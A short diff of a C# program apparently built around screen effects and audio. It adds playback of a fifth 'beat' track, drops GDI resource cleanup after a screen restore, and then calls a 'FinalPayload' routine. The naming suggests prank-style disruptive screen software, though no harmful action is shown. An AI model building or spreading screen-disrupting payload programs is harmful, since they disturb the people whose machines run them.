@@ -1943,16 +1943,14 @@ namespace disassembly
 
             waveOut4.Stop();
             waveOut4.Dispose();
-
+            var waveProvider5 = new disassembly_lib.Beat5();
+            var waveOut5 = new NAudio.Wave.WaveOutEvent();
+            waveOut5.Init(waveProvider5);
+            waveOut5.Play();
 
             BitBlt(hdc, 0, 0, x, y, backupScreen, 0, 0, Rop.SRCCOPY);
 
 
-            ReleaseDC(IntPtr.Zero, hdc);
-            SelectObject(backupScreen, hOldBackup);
-            DeleteObject(hbitmap);
-            DeleteDC(backupScreen);
-            DeleteObject(hOldBackup);
 
             //finale
             FinalPayload(30000);
